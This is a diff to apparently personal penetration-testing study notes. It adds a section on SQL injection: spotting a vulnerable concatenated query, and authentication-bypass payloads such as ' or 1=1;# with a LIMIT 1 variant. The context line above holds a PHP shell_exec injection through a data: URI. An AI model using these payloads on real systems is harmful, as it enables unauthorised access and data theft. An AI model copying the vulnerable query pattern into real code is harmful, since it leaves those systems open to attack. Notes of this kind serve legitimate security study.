@@ -91,8 +91,22 @@ http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
 
 # SQL injections
 SELECT * FROM users;
+SELECT username FROM users WHERE id=1;
+## Identify SQL Injection Vulnerabilities     # try ' and if there is an error --> most likely vulnerable
+- Vulnerable Code
+$query = "select * from users where username = '$user' and password = '$pass'";
+- with using ' an error may be appear:
+$query = "select * from users where username =''' and password = 'password123' ";   # wrong syntax //Wr0ngSynH4X
+## Authentication Bypass
+- normal login:
+select * from users where name = 'tom' and password = 'jones';
+- Bypass:
+select * from users where name = 'tom' or 1=1;#' and password = 'jones';  # the server reads only --> select * from users where name = 'tom' or 1=1;    ## all rows will be returned!
+- Some programming languages have functions that query the database and expect a single record. If these functions get more than one row, they will generate an error.
+- if there is limitation of one raw, we can use:
+select * from users where name = 'tom' or 1=1 LIMIT 1;#
 
-
+# Enumerate the DB
 
 
 
